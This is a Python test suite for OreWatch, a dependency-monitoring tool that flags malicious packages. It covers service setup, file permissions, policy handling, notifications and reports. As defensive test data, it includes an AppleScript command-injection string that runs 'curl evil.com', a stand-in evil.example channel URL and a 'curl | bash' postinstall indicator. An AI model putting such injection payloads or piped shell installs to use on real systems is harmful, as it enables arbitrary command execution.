import contextlib
import io
import json
import os
import pathlib
import shutil
import sqlite3
import stat
import subprocess
import sys
import tempfile
import threading
import unittest
import urllib.parse
from unittest.mock import Mock, patch

from collectors import db as collector_db
from monitor import api as monitor_api_module
from monitor.api import monitor_api_request
from monitor.cli import run_monitor_cli
from monitor.config import DEFAULT_CONFIG
from monitor.config import get_legacy_monitor_paths
from monitor.config import load_monitor_config
from monitor.config import save_monitor_config
from monitor import mcp_adapter as monitor_mcp_adapter
from monitor.ide_bootstrap import build_ide_bootstrap
from monitor.ide_bootstrap import build_mcp_server_definition
from monitor.menubar import build_detached_menubar_command
from monitor.menubar import _deliver_macos_notification
from monitor.menubar import _pid_is_running
from monitor.menubar import build_menu_bar_button_title
from monitor.menubar import build_popup_title
from monitor.menubar import MENUBAR_APPLE_NOTIFICATION_SCRIPT
from monitor.menubar import launch_menubar_app_detached
from monitor.menubar import MenuBarSnapshot
from monitor.menubar import build_menu_bar_title
from monitor.menubar import build_menu_bar_tooltip
from monitor.menubar import count_unacknowledged_alert_notifications
from monitor.menubar import format_notification_context
from monitor.menubar import latest_attention_notification
from monitor.menubar import notification_requires_attention
from monitor.menubar import orewatch_version_label
from monitor.menubar import _selector
from monitor.mcp_adapter import MCPBridge
from monitor.mcp_adapter import _read_message
from monitor.mcp_adapter import _write_message
from monitor.mcp_adapter import run_mcp_adapter
from monitor import notifier as monitor_notifier
from monitor import policy as monitor_policy
from monitor.service import MonitorService
from monitor.service import render_launchd_plist
from monitor.service import render_systemd_service
from monitor.snapshot_updater import build_snapshot
from monitor.snapshot_updater import generate_keypair
from monitor.snapshot_updater import publish_snapshot
from monitor.state import MonitorState
from monitor.watcher import detect_changes, take_project_snapshot
from scanners.supported_files import ECOSYSTEM_PRIORITY
from scanners import report_generator
from scanner_engine import ScanResult


def _build_data_metadata():
    return {
        "data_status": "complete",
        "sources_used": ["openssf", "osv"],
        "experimental_sources_used": [],
        "missing_ecosystems": [],
    }


def _build_database_statuses(default_status="complete"):
    return {
        ecosystem: {
            "exists": default_status != "failed",
            "usable": default_status in {"complete", "partial"},
            "data_status": default_status,
            "sources_used": ["openssf", "osv"] if default_status != "failed" else [],
            "experimental_sources_used": [],
            "last_successful_collect": "2026-04-03T00:00:00Z" if default_status != "failed" else "",
            "metadata_ready": default_status != "failed",
        }
        for ecosystem in ECOSYSTEM_PRIORITY
    }


class MonitorTests(unittest.TestCase):
    def setUp(self):
        self._config_root = tempfile.TemporaryDirectory()
        self._state_root = tempfile.TemporaryDirectory()
        self._env_patch = patch.dict(
            os.environ,
            {
                "OREWATCH_CONFIG_HOME": self._config_root.name,
                "OREWATCH_STATE_HOME": self._state_root.name,
            },
            clear=False,
        )
        self._env_patch.start()

    def tearDown(self):
        self._env_patch.stop()
        self._config_root.cleanup()
        self._state_root.cleanup()

    def _generate_keys(self, repo_root):
        return generate_keypair(os.path.join(repo_root, "keys"))

    def _write_snapshot_fixture_db(self, db_path: str, marker: str) -> bytes:
        conn = sqlite3.connect(db_path)
        try:
            conn.execute("CREATE TABLE snapshot_marker (value TEXT NOT NULL)")
            conn.execute("INSERT INTO snapshot_marker(value) VALUES (?)", (marker,))
            conn.commit()
        finally:
            conn.close()
        with open(db_path, "rb") as handle:
            return handle.read()

    def test_install_creates_monitor_layout_and_service_files(self):
        with tempfile.TemporaryDirectory() as repo_root:
            service = MonitorService(repo_root)
            info = service.install(service_manager="background", auto_start=False)

            self.assertTrue(os.path.exists(info["config"]))
            self.assertTrue(os.path.exists(info["state_db"]))
            self.assertTrue(os.path.exists(info["launchd"]))
            self.assertTrue(os.path.exists(info["systemd"]))
            self.assertFalse(service.config["snapshots"]["use_live_collection_fallback"])

    def test_install_auto_falls_back_to_background_when_native_setup_fails(self):
        with tempfile.TemporaryDirectory() as repo_root:
            service = MonitorService(repo_root)
            with patch.object(service, "_detect_available_service_manager", return_value="launchd"):
                with patch.object(
                    service,
                    "_install_manager_service",
                    return_value={
                        "success": False,
                        "service_manager": "launchd",
                        "message": "Bootstrap failed: 5: Input/output error",
                    },
                ):
                    with patch.object(
                        service,
                        "_start_local_background",
                        return_value={"success": True, "message": "Monitor started", "pid": 12345},
                    ) as mocked_background:
                        info = service.install(service_manager="auto", auto_start=True)

            self.assertTrue(info["success"])
            self.assertEqual(info["service_manager"], "background")
            self.assertEqual(info["fallback_from_service_manager"], "launchd")
            self.assertIn("Bootstrap failed", info["fallback_reason"])
            self.assertIn("Falling back to local background mode", info["message"])
            mocked_background.assert_called_once_with()

    def test_install_auto_falls_back_to_background_when_native_setup_raises(self):
        with tempfile.TemporaryDirectory() as repo_root:
            service = MonitorService(repo_root)
            with patch.object(service, "_detect_available_service_manager", return_value="launchd"):
                with patch.object(
                    service,
                    "_install_manager_service",
                    side_effect=PermissionError("Operation not permitted"),
                ):
                    with patch.object(
                        service,
                        "_start_local_background",
                        return_value={"success": True, "message": "Monitor started", "pid": 12345},
                    ):
                        info = service.install(service_manager="auto", auto_start=True)

            self.assertTrue(info["success"])
            self.assertEqual(info["service_manager"], "background")
            self.assertEqual(info["fallback_from_service_manager"], "launchd")
            self.assertIn("Operation not permitted", info["fallback_reason"])

    def test_monitor_layout_uses_owner_only_permissions(self):
        with tempfile.TemporaryDirectory() as repo_root:
            service = MonitorService(repo_root)
            service.install(service_manager="background", auto_start=False)

            home_mode = stat.S_IMODE(os.stat(service.paths["home"]).st_mode)
            config_mode = stat.S_IMODE(os.stat(service.paths["config"]).st_mode)
            db_mode = stat.S_IMODE(os.stat(service.paths["state_db"]).st_mode)

            self.assertEqual(home_mode, 0o700)
            self.assertEqual(config_mode, 0o600)
            self.assertEqual(db_mode, 0o600)

    def test_monitor_service_survives_unwritable_log_file(self):
        with tempfile.TemporaryDirectory() as repo_root:
            with patch("monitor.service.logging.FileHandler.__init__", side_effect=PermissionError("Operation not permitted")):
                with self.assertLogs("monitor.service", level="WARNING") as captured:
                    service = MonitorService(repo_root)

            self.assertTrue(any("continuing without file logging" in line for line in captured.output))
            self.assertEqual(service.paths["repo_root"], repo_root)

    def test_monitor_ignores_repo_local_ore_monitor_config(self):
        with tempfile.TemporaryDirectory() as repo_root:
            repo_monitor_dir = os.path.join(repo_root, ".ore-monitor")
            os.makedirs(repo_monitor_dir, exist_ok=True)
            with open(os.path.join(repo_monitor_dir, "config.yaml"), "w", encoding="utf-8") as handle:
                handle.write(
                    "snapshots:\n"
                    "  channel_url: https://evil.example/channel.json\n"
                    "notifications:\n"
                    "  desktop: false\n"
                )

            service = MonitorService(repo_root)

            self.assertEqual(service.config["snapshots"]["channel_url"], "")
            self.assertTrue(service.config["notifications"]["desktop"])
            self.assertTrue(
                service.paths["config"].startswith(os.path.realpath(self._config_root.name))
            )
            self.assertFalse(
                service.paths["config"].startswith(repo_root)
            )

    def test_monitor_service_rejects_symlinked_user_config_home(self):
        with tempfile.TemporaryDirectory() as repo_root, tempfile.TemporaryDirectory() as outside_dir:
            symlink_root = os.path.join(repo_root, "config-link")
            os.symlink(outside_dir, symlink_root)

            with patch.dict(
                os.environ,
                {"OREWATCH_CONFIG_HOME": symlink_root},
                clear=False,
            ):
                with self.assertRaises(RuntimeError):
                    MonitorService(repo_root)

    def test_monitor_service_rejects_symlinked_user_state_home(self):
        with tempfile.TemporaryDirectory() as repo_root, tempfile.TemporaryDirectory() as outside_dir:
            symlink_root = os.path.join(repo_root, "state-link")
            os.symlink(outside_dir, symlink_root)

            with patch.dict(
                os.environ,
                {"OREWATCH_STATE_HOME": symlink_root},
                clear=False,
            ):
                with self.assertRaises(RuntimeError):
                    MonitorService(repo_root)

    def test_monitor_service_allows_tempdir_user_roots(self):
        with tempfile.TemporaryDirectory() as repo_root, tempfile.TemporaryDirectory() as config_root, tempfile.TemporaryDirectory() as state_root:
            with patch.dict(
                os.environ,
                {
                    "OREWATCH_CONFIG_HOME": config_root,
                    "OREWATCH_STATE_HOME": state_root,
                },
                clear=False,
            ):
                service = MonitorService(repo_root)

            self.assertTrue(service.paths["config_home"].startswith(os.path.realpath(config_root)))
            self.assertTrue(service.paths["state_home"].startswith(os.path.realpath(state_root)))

    def test_project_policy_file_is_ignored_by_default(self):
        with tempfile.TemporaryDirectory() as project_dir:
            policy_path = os.path.join(project_dir, ".ore-monitor.yml")
            with open(policy_path, "w", encoding="utf-8") as handle:
                handle.write(
                    "severity_threshold: critical\n"
                    "ignored_packages:\n"
                    "  - badpkg\n"
                )

            loaded = monitor_policy.load_project_policy(project_dir, {"defaults": {}})

            self.assertEqual(loaded["severity_threshold"], "low")
            self.assertEqual(loaded["ignored_packages"], [])

    def test_project_policy_file_requires_explicit_opt_in_for_suppressions(self):
        with tempfile.TemporaryDirectory() as project_dir:
            policy_path = os.path.join(project_dir, ".ore-monitor.yml")
            with open(policy_path, "w", encoding="utf-8") as handle:
                handle.write(
                    "severity_threshold: critical\n"
                    "ignored_packages:\n"
                    "  - badpkg\n"
                )

            loaded = monitor_policy.load_project_policy(
                project_dir,
                {
                    "defaults": {},
                    "policy": {
                        "allow_project_file": True,
                        "allow_project_suppressions": False,
                    },
                },
            )

            self.assertEqual(loaded["severity_threshold"], "critical")
            self.assertEqual(loaded["ignored_packages"], [])

    def test_desktop_notification_uses_osascript_arguments_without_interpolation(self):
        class DummyState:
            def __init__(self):
                self.notifications = []

            def add_notification(self, project_path, kind, message, finding_fingerprint=None):
                self.notifications.append((project_path, kind, message, finding_fingerprint))

        state = DummyState()
        notifier = monitor_notifier.Notifier(
            state,
            {
                "notifications": {
                    "desktop": True,
                    "terminal": False,
                    "popup_via_menubar": False,
                }
            },
        )
        malicious_message = 'foo" & do shell script "curl evil.com" & "'

        with patch("monitor.notifier.shutil.which", side_effect=lambda cmd: "/usr/bin/osascript" if cmd == "osascript" else None):
            with patch.object(notifier, "_emit_desktop_pyobjc", return_value=False):
                with patch("monitor.notifier.subprocess.run") as mocked_run:
                    notifier._emit("/tmp/project", "findings", malicious_message)

        args = mocked_run.call_args.args[0]
        self.assertEqual(args[:3], ["osascript", "-e", monitor_notifier.APPLE_NOTIFICATION_SCRIPT])
        self.assertEqual(args[3:], ["OreWatch", malicious_message])
        self.assertNotIn(malicious_message, monitor_notifier.APPLE_NOTIFICATION_SCRIPT)

    def test_desktop_notification_skips_osascript_when_menubar_is_running(self):
        class DummyState:
            def __init__(self):
                self.notifications = []

            def add_notification(self, project_path, kind, message, finding_fingerprint=None):
                self.notifications.append((project_path, kind, message, finding_fingerprint))

        with tempfile.TemporaryDirectory() as state_root:
            menubar_pid = os.path.join(state_root, "menubar.pid")
            with open(menubar_pid, "w", encoding="utf-8") as handle:
                handle.write("4321")
            notifier = monitor_notifier.Notifier(
                DummyState(),
                {"notifications": {"desktop": True, "terminal": False, "popup_via_menubar": True}},
                paths={"menubar_pid": menubar_pid},
            )

            with patch("monitor.notifier.os.kill") as mocked_kill:
                with patch("monitor.notifier.subprocess.run") as mocked_run:
                    notifier._emit("/tmp/project", "findings", "alert")

        mocked_kill.assert_called_once_with(4321, 0)
        mocked_run.assert_not_called()

    def test_notifier_message_includes_package_severity_and_report_path(self):
        class DummyState:
            def __init__(self):
                self.notifications = []

            def add_notification(self, project_path, kind, message, finding_fingerprint=None):
                self.notifications.append((project_path, kind, message, finding_fingerprint))

        state = DummyState()
        notifier = monitor_notifier.Notifier(
            state,
            {"notifications": {"desktop": False, "terminal": False}},
        )

        notifier.notify_project_changes(
            "/tmp/project",
            {
                "new_findings": [
                    {
                        "finding_type": "malicious_package",
                        "severity": "critical",
                        "title": "Malicious package badpkg@1.0.0",
                        "payload": {"name": "badpkg", "version": "1.0.0", "ecosystem": "npm"},
                    }
                ],
                "escalated_findings": [],
                "resolved_findings": [],
            },
            {"notify_on": ["malicious_package"]},
            report_path="/tmp/report.json",
        )

        self.assertEqual(len(state.notifications), 1)
        _project_path, kind, message, _fingerprint = state.notifications[0]
        self.assertEqual(kind, "findings")
        self.assertIn("CRITICAL", message)
        self.assertIn("badpkg@1.0.0", message)
        self.assertIn("/tmp/report.json", message)

    def test_notifier_posts_generic_webhook_payload(self):
        class DummyState:
            def add_notification(self, project_path, kind, message, finding_fingerprint=None):
                del project_path, kind, message, finding_fingerprint

        class DummyResponse:
            def __enter__(self):
                return self

            def __exit__(self, exc_type, exc, tb):
                return False

        notifier = monitor_notifier.Notifier(
            DummyState(),
            {
                "notifications": {
                    "desktop": False,
                    "terminal": False,
                    "webhook_url": "https://hooks.example.test/orewatch",
                    "webhook_format": "generic",
                    "webhook_headers": {"X-Test": "true"},
                }
            },
        )
        captured = {}

        def fake_urlopen(request, timeout=0):
            captured["request"] = request
            captured["timeout"] = timeout
            return DummyResponse()

        with patch("monitor.notifier.urllib.request.urlopen", side_effect=fake_urlopen):
            notifier.notify_project_changes(
                "/tmp/project",
                {
                    "new_findings": [
                        {
                            "finding_type": "malicious_package",
                            "severity": "critical",
                            "title": "Malicious package badpkg@1.0.0",
                            "payload": {"name": "badpkg", "version": "1.0.0", "ecosystem": "npm"},
                        }
                    ],
                    "escalated_findings": [],
                    "resolved_findings": [],
                },
                {"notify_on": ["malicious_package"]},
                report_path="/tmp/report.json",
            )

        request = captured["request"]
        self.assertEqual(request.get_method(), "POST")
        self.assertEqual(request.get_header("Content-type"), "application/json")
        self.assertEqual(request.get_header("X-test"), "true")
        payload = json.loads(request.data.decode("utf-8"))
        self.assertEqual(payload["event"], "orewatch.findings")
        self.assertIn("badpkg@1.0.0", payload["message"])
        self.assertEqual(payload["details"]["report_path"], "/tmp/report.json")

    def test_generate_report_redacts_absolute_scanned_path(self):
        with tempfile.TemporaryDirectory() as temp_dir:
            report_path = os.path.join(temp_dir, "report.json")
            output_path = report_generator.generate_report(
                ecosystem="npm",
                scanned_path="/Users/demo/private/project/subdir",
                total_packages_scanned=0,
                malicious_packages=[],
                iocs=[],
                output_path=report_path,
            )

            with open(output_path, "r", encoding="utf-8") as handle:
                report = json.load(handle)

        self.assertEqual(
            report["scanned_path"],
            report_generator.ABSOLUTE_PATH_REDACTED,
        )

    def test_generate_report_writes_html_companion_with_consistent_style(self):
        with tempfile.TemporaryDirectory() as temp_dir:
            report_path = os.path.join(temp_dir, "report.json")
            output_path = report_generator.generate_report(
                ecosystem="npm",
                scanned_path=temp_dir,
                total_packages_scanned=3,
                malicious_packages=[
                    {
                        "name": "badpkg",
                        "version": "1.0.0",
                        "ecosystem": "npm",
                        "severity": "critical",
                        "description": "Known malicious package",
                        "sources": ["openssf", "osv"],
                        "locations": [
                            {
                                "physicalLocation": {
                                    "artifactLocation": {"uri": "package.json"},
                                    "region": {"startLine": 5},
                                }
                            }
                        ],
                    }
                ],
                iocs=[
                    {
                        "type": "malicious_postinstall",
                        "severity": "HIGH",
                        "path": "package.json",
                        "pattern": "curl | bash",
                    }
                ],
                output_path=report_path,
                data_metadata={
                    "data_status": "partial",
                    "sources_used": ["openssf", "osv"],
                    "experimental_sources_used": ["phylum"],
                    "missing_ecosystems": ["pypi"],
                    "promotion_decision": "rejected",
                    "kept_last_known_good": True,
                    "anomalies": [{"severity": "block", "message": "count drop"}],
                },
            )

            html_report_path = report_generator.get_html_report_path(output_path)
            with open(html_report_path, "r", encoding="utf-8") as handle:
                html_report = handle.read()

            self.assertTrue(os.path.exists(html_report_path))
            self.assertIn("OreWatch Scan Report", html_report)
            self.assertIn("--accent-primary: #2E90FA;", html_report)
            self.assertIn("Threat Data", html_report)
            self.assertIn("badpkg", html_report)
            self.assertIn("MALICIOUS POSTINSTALL", html_report)

    def test_connection_info_reports_token_and_base_url(self):
        with tempfile.TemporaryDirectory() as repo_root:
            service = MonitorService(repo_root)
            with patch.object(service, "_installed_service_manager", return_value=None):
                with patch.object(service, "_detect_available_service_manager", return_value="background"):
                    info = service.get_connection_info()

            self.assertEqual(info["token_path"], service.paths["api_token"])
            self.assertTrue(info["base_url"].startswith("http://127.0.0.1:"))
            self.assertFalse(info["running"])
            self.assertEqual(info["monitor_scope"], "singleton")
            self.assertEqual(info["monitor_home"], service.paths["home"])
            self.assertEqual(info["workspace_root"], repo_root)
            self.assertEqual(info["mcp_server"]["args"][-2:], ["monitor", "mcp"])
            self.assertIn("claude_code", info["supported_bootstrap_clients"])

    def test_build_mcp_server_definition_prefers_absolute_console_script_path(self):
        with patch("monitor.ide_bootstrap.shutil.which", return_value="/tmp/venv/bin/orewatch"):
            definition = build_mcp_server_definition()

        self.assertEqual(definition["command"], "/tmp/venv/bin/orewatch")
        self.assertEqual(definition["args"], ["monitor", "mcp"])

    def test_status_and_doctor_include_runtime_lock_path(self):
        with tempfile.TemporaryDirectory() as repo_root:
            service = MonitorService(repo_root)
            status = service.get_status()
            doctor = service.doctor()

        self.assertEqual(status["runtime_lock_path"], service.paths["lock"])
        self.assertEqual(doctor["runtime_lock_path"], service.paths["lock"])

    def test_connection_info_honors_workspace_root_before_subcommand(self):
        with tempfile.TemporaryDirectory() as workspace_root, tempfile.TemporaryDirectory() as other_cwd:
            stdout = io.StringIO()
            with patch("os.getcwd", return_value=other_cwd):
                with contextlib.redirect_stdout(stdout):
                    result = run_monitor_cli(
                        [
                            "--workspace-root",
                            workspace_root,
                            "connection-info",
                        ]
                    )

            self.assertEqual(result, 0)
            payload = json.loads(stdout.getvalue())
            self.assertEqual(payload["workspace_root"], workspace_root)
            self.assertEqual(payload["monitor_scope"], "singleton")
            self.assertEqual(payload["mcp_server"]["args"], ["monitor", "mcp"])

    def test_build_ide_bootstrap_includes_mcp_and_api_variants(self):
        with tempfile.TemporaryDirectory() as repo_root:
            service = MonitorService(repo_root)
            bootstrap = build_ide_bootstrap(service.get_connection_info())

            self.assertIn("mcpServers", bootstrap["claude_code"]["snippet"])
            self.assertNotIn('"--workspace-root"', bootstrap["claude_code"]["snippet"])
            self.assertTrue(
                any(
                    "bare `orewatch`" in note
                    for note in bootstrap["claude_code"]["notes"]
                )
            )
            self.assertIn('"baseUrl"', bootstrap["vscode"]["snippet"])
            self.assertIn("JetBrains / PyCharm", bootstrap["jetbrains"]["label"])
            self.assertIn("Xcode", bootstrap["xcode"]["label"])
            self.assertIn('"tokenPath"', bootstrap["xcode"]["snippet"])

    def test_menu_bar_title_and_tooltip_reflect_finding_state(self):
        snapshot = MenuBarSnapshot(
            running=True,
            api_listening=True,
            active_findings=2,
            highest_active_severity="critical",
            active_findings_preview=[
                {"title": "Malicious package badpkg@1.0.0"},
            ],
            recent_notifications=[
                {"message": "2 new finding(s) in project: CRITICAL Malicious package badpkg@1.0.0"}
            ],
            monitor_home="/tmp/orewatch",
            reports_dir="/tmp/orewatch/reports",
            log_file="/tmp/orewatch/logs/monitor.log",
            api_base_url="http://127.0.0.1:48736",
            watch_count=3,
        )

        self.assertEqual(build_menu_bar_title(snapshot), "OW!2")
        tooltip = build_menu_bar_tooltip(snapshot)
        self.assertIn(f"{orewatch_version_label()} monitor running", tooltip)
        self.assertIn("Watched projects: 3", tooltip)
        self.assertIn("Top finding: Malicious package badpkg@1.0.0", tooltip)

    def test_orewatch_version_label_includes_current_version(self):
        self.assertRegex(orewatch_version_label(), r"^OreWatch v\d+\.\d+\.\d+$")

    def test_menu_bar_title_switches_to_alert_state_for_unacknowledged_notifications(self):
        snapshot = MenuBarSnapshot(
            running=True,
            api_listening=True,
            active_findings=2,
            highest_active_severity="critical",
            active_findings_preview=[
                {"title": "Malicious package badpkg@1.0.0"},
            ],
            recent_notifications=[
                {"id": 11, "kind": "findings", "message": "Critical finding detected"},
                {"id": 10, "kind": "resolved", "message": "Older resolved finding"},
            ],
            monitor_home="/tmp/orewatch",
            reports_dir="/tmp/orewatch/reports",
            log_file="/tmp/orewatch/logs/monitor.log",
            api_base_url="http://127.0.0.1:48736",
            watch_count=3,
        )

        self.assertTrue(notification_requires_attention(snapshot.recent_notifications[0]))
        self.assertFalse(notification_requires_attention(snapshot.recent_notifications[1]))
        self.assertEqual(
            count_unacknowledged_alert_notifications(snapshot.recent_notifications, 10),
            1,
        )
        self.assertEqual(
            build_menu_bar_title(snapshot, attention_alert_count=1),
            "OW!",
        )
        tooltip = build_menu_bar_tooltip(snapshot, attention_alert_count=1)
        self.assertIn("New alerts requiring review: 1", tooltip)
        self.assertIn("Latest alert: Critical finding detected", tooltip)
        self.assertNotIn("Top finding:", tooltip)

    def test_latest_attention_notification_is_newest_and_has_context(self):
        notifications = [
            {
                "id": 14,
                "kind": "resolved",
                "message": "Older resolved item",
                "project_name": "demo-project",
                "created_at": "2026-04-06T20:46:00Z",
            },
            {
                "id": 13,
                "kind": "dependency_blocked",
                "message": "Blocked malicious package JUMFlot@99.99.99",
                "project_name": "demo-project",
                "created_at": "2026-04-06T20:47:58Z",
            },
            {
                "id": 12,
                "kind": "findings",
                "message": "Older active finding",
                "project_name": "demo-project",
                "created_at": "2026-04-06T20:40:00Z",
            },
        ]

        latest = latest_attention_notification(notifications)

        self.assertIsNotNone(latest)
        self.assertEqual(latest["id"], 13)
        self.assertEqual(
            format_notification_context(latest),
            "demo-project | 2026-04-06 20:47:58 UTC",
        )

    def test_live_update_anomaly_is_not_current_after_later_successful_promotion(self):
        notifications = [
            {
                "id": 14,
                "kind": "live_update_anomaly",
                "message": "Candidate rejected earlier",
                "created_at": "2026-04-06T20:40:00Z",
            }
        ]
        snapshot = MenuBarSnapshot(
            running=True,
            api_listening=True,
            active_findings=0,
            highest_active_severity=None,
            active_findings_preview=[],
            recent_notifications=notifications,
            monitor_home="/tmp/orewatch",
            reports_dir="/tmp/orewatch/reports",
            log_file="/tmp/orewatch/logs/monitor.log",
            api_base_url="http://127.0.0.1:48736",
            watch_count=1,
            last_live_promotion_at="2026-04-06T20:45:00Z",
            last_live_promotion_status="success",
        )

        self.assertEqual(
            count_unacknowledged_alert_notifications(
                notifications,
                0,
                last_live_promotion_at=snapshot.last_live_promotion_at,
                last_live_promotion_status=snapshot.last_live_promotion_status,
            ),
            0,
        )
        self.assertIsNone(
            latest_attention_notification(
                notifications,
                last_live_promotion_at=snapshot.last_live_promotion_at,
                last_live_promotion_status=snapshot.last_live_promotion_status,
            )
        )
        tooltip = build_menu_bar_tooltip(snapshot)
        self.assertNotIn("Candidate rejected earlier", tooltip)

    def test_menu_bar_title_marks_stopped_monitor_without_findings(self):
        snapshot = MenuBarSnapshot(
            running=False,
            api_listening=False,
            active_findings=0,
            highest_active_severity=None,
            active_findings_preview=[],
            recent_notifications=[],
            monitor_home="/tmp/orewatch",
            reports_dir="/tmp/orewatch/reports",
            log_file="/tmp/orewatch/logs/monitor.log",
            api_base_url="http://127.0.0.1:48736",
            watch_count=0,
        )

        self.assertEqual(build_menu_bar_title(snapshot), "OW?")

    def test_menu_bar_button_title_falls_back_to_text_when_icon_is_missing(self):
        snapshot = MenuBarSnapshot(
            running=True,
            api_listening=True,
            active_findings=2,
            highest_active_severity="critical",
            active_findings_preview=[],
            recent_notifications=[],
            monitor_home="/tmp/orewatch",
            reports_dir="/tmp/orewatch/reports",
            log_file="/tmp/orewatch/logs/monitor.log",
            api_base_url="http://127.0.0.1:48736",
            watch_count=1,
        )

        self.assertEqual(
            build_menu_bar_button_title(snapshot, has_status_icon=False),
            "OW!2",
        )
        self.assertEqual(
            build_menu_bar_button_title(
                snapshot,
                attention_alert_count=1,
                has_status_icon=False,
            ),
            "OW!",
        )

    def test_menu_bar_button_title_badges_status_icon_for_unreviewed_alerts(self):
        snapshot = MenuBarSnapshot(
            running=True,
            api_listening=True,
            active_findings=0,
            highest_active_severity=None,
            active_findings_preview=[],
            recent_notifications=[],
            monitor_home="/tmp/orewatch",
            reports_dir="/tmp/orewatch/reports",
            log_file="/tmp/orewatch/logs/monitor.log",
            api_base_url="http://127.0.0.1:48736",
            watch_count=1,
        )

        self.assertEqual(build_menu_bar_button_title(snapshot, has_status_icon=True), "")
        self.assertEqual(
            build_menu_bar_button_title(
                snapshot,
                attention_alert_count=1,
                has_status_icon=True,
            ),
            "!",
        )
        self.assertEqual(
            build_menu_bar_button_title(
                snapshot,
                attention_alert_count=4,
                has_status_icon=True,
            ),
            "!4",
        )
        self.assertEqual(
            build_menu_bar_button_title(
                snapshot,
                attention_alert_count=12,
                has_status_icon=True,
            ),
            "!9+",
        )

    def test_menu_bar_selector_maps_pyobjc_method_names(self):
        self.assertEqual(_selector("refresh_"), "refresh:")
        self.assertEqual(_selector("openReportsFolder_"), "openReportsFolder:")
        self.assertEqual(_selector("quitApp_"), "quitApp:")

    def test_menu_bar_popup_title_matches_notification_kind(self):
        self.assertEqual(build_popup_title({"kind": "findings"}), "OreWatch security alert")
        self.assertEqual(build_popup_title({"kind": "resolved"}), "OreWatch resolved finding")

    def test_menu_bar_uses_osascript_for_notification_center_popup(self):
        with patch("monitor.menubar.shutil.which", return_value="/usr/bin/osascript"):
            with patch(
                "monitor.menubar.subprocess.run",
                return_value=subprocess.CompletedProcess(
                    args=["osascript"],
                    returncode=0,
                    stdout="",
                    stderr="",
                ),
            ) as mocked_run:
                delivered = _deliver_macos_notification(
                    "OreWatch security alert",
                    "demo-project",
                    "CRITICAL Malicious package -gzip-ize@1.0.0",
                )

        self.assertTrue(delivered)
        args = mocked_run.call_args.args[0]
        self.assertEqual(args[:3], ["osascript", "-e", MENUBAR_APPLE_NOTIFICATION_SCRIPT])
        self.assertEqual(
            args[3:],
            [
                "OreWatch security alert",
                "demo-project",
                "CRITICAL Malicious package -gzip-ize@1.0.0",
            ],
        )

    def test_menu_bar_pid_check_treats_zombie_process_as_not_running(self):
        with patch("monitor.menubar.os.kill") as mocked_kill:
            with patch(
                "monitor.menubar.subprocess.run",
                return_value=subprocess.CompletedProcess(
                    args=["ps"],
                    returncode=0,
                    stdout="Z+\n",
                    stderr="",
                ),
            ):
                running = _pid_is_running(39555)

        self.assertFalse(running)
        mocked_kill.assert_called_once_with(39555, 0)

    def test_singleton_monitor_reuses_same_config_and_port_across_workspace_roots(self):
        with tempfile.TemporaryDirectory() as repo_root_a, tempfile.TemporaryDirectory() as repo_root_b:
            save_monitor_config(DEFAULT_CONFIG, repo_root_a)
            save_monitor_config(DEFAULT_CONFIG, repo_root_b)

            config_b = load_monitor_config(repo_root_b)
            persisted_b = load_monitor_config(repo_root_b)

        self.assertEqual(config_b["api"]["port"], DEFAULT_CONFIG["api"]["port"])
        self.assertEqual(config_b["api"]["port"], persisted_b["api"]["port"])

    def test_start_api_server_reassigns_port_when_default_is_in_use(self):
        with tempfile.TemporaryDirectory() as repo_root:
            service = MonitorService(repo_root)
            initial_port = service.config["api"]["port"]
            attempts = []

            class FakeServer:
                def __init__(self, service_obj, host, port, api_token):
                    del service_obj, api_token
                    self.host = host
                    self.port = port
                    self.listening = False
                    self.base_url = f"http://{host}:{port}"

                def start(self):
                    attempts.append(self.port)
                    if len(attempts) == 1:
                        raise OSError(48, "Address already in use")
                    self.listening = True
                    self.base_url = f"http://{self.host}:{self.port}"
                    return self.base_url

                def stop(self):
                    self.listening = False

            with patch("monitor.service.LocalMonitorAPIServer", FakeServer):
                with patch("monitor.service.allocate_api_port", return_value=49123):
                    base_url = service.start_api_server()

            self.assertEqual(attempts, [initial_port, 49123])
            self.assertEqual(base_url, "http://127.0.0.1:49123")
            self.assertEqual(service.config["api"]["port"], 49123)

    def test_mcp_server_definition_fallback_does_not_assume_workspace_root_script(self):
        with tempfile.TemporaryDirectory() as workspace_root:
            with patch("monitor.ide_bootstrap.shutil.which", return_value=None):
                definition = build_mcp_server_definition()

        self.assertEqual(definition["command"], sys.executable)
        self.assertEqual(
            definition["args"][-2:],
            ["monitor", "mcp"],
        )
        self.assertNotIn(
            os.path.join(workspace_root, "malicious_package_scanner.py"),
            definition["args"],
        )

    def test_service_templates_do_not_assume_workspace_root_script(self):
        with tempfile.TemporaryDirectory() as workspace_root:
            log_file = os.path.join(workspace_root, "orewatch.log")
            plist = render_launchd_plist(
                workspace_root,
                sys.executable,
                "org.orewatch.test",
                log_file,
            )
            systemd = render_systemd_service(workspace_root, sys.executable, log_file)

        workspace_script = os.path.join(workspace_root, "malicious_package_scanner.py")
        self.assertIn(f"<string>{workspace_root}</string>", plist)
        self.assertNotIn(workspace_script, plist)
        self.assertIn(workspace_root, systemd)
        self.assertNotIn(workspace_script, systemd)

    def test_background_start_uses_runtime_command_not_workspace_script(self):
        with tempfile.TemporaryDirectory() as workspace_root:
            service = MonitorService(workspace_root)
            process = Mock(pid=77777)
            with patch("monitor.service.read_pid", side_effect=[None, 4321]):
                with patch("monitor.service.pid_is_running", side_effect=[False, True]):
                    with patch("monitor.service.subprocess.Popen", return_value=process) as mocked_popen:
                        result = service._start_local_background()

        self.assertTrue(result["success"])
        command = mocked_popen.call_args.args[0]
        self.assertEqual(
            command[-2:],
            ["monitor", "run"],
        )
        self.assertNotIn(
            os.path.join(workspace_root, "malicious_package_scanner.py"),
            command,
        )

    def test_background_start_treats_runtime_lock_contention_as_already_running(self):
        with tempfile.TemporaryDirectory() as workspace_root:
            service = MonitorService(workspace_root)
            with patch.object(service, "_runtime_lock_available", return_value=False):
                with patch("monitor.service.read_pid", return_value=4321):
                    with patch("monitor.service.pid_is_running", return_value=False):
                        with patch("monitor.service.subprocess.Popen") as mocked_popen:
                            result = service._start_local_background()

        self.assertTrue(result["success"])
        self.assertEqual(result["message"], "Monitor already running")
        self.assertEqual(result["pid"], 4321)
        mocked_popen.assert_not_called()

    def test_run_forever_refuses_second_runtime_when_lock_unavailable(self):
        with tempfile.TemporaryDirectory() as repo_root:
            service = MonitorService(repo_root)
            with patch.object(service.runtime_lock, "acquire", return_value=False):
                with patch("monitor.service.read_pid", return_value=4321):
                    with self.assertRaises(RuntimeError) as captured:
                        service.run_forever(max_loops=0)

        self.assertIn("Monitor already running with pid 4321", str(captured.exception))

    def test_status_reports_menubar_runtime(self):
